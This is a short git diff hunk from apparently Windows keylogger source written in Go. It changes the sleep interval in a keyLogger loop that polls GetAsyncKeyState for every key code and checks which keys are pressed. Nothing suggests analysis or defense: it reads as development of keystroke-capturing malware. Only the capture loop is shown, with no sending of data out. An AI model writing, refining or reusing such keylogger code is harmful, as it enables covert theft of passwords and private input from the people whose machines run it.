@@ -79,9 +79,9 @@ func windowLogger() {
 
 func keyLogger() {
 	for {
-		//time.Sleep(1 * time.Nanosecond)
+		time.Sleep(1 * time.Millisecond)
 		for KEY := 0; KEY <= 256; KEY++ {
-			time.Sleep(1 * time.Nanosecond)
+			time.Sleep(1 * time.Millisecond)
 			Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
 			//fmt.Println(Val, val2, val3)
 			if int(Val) != 0 {
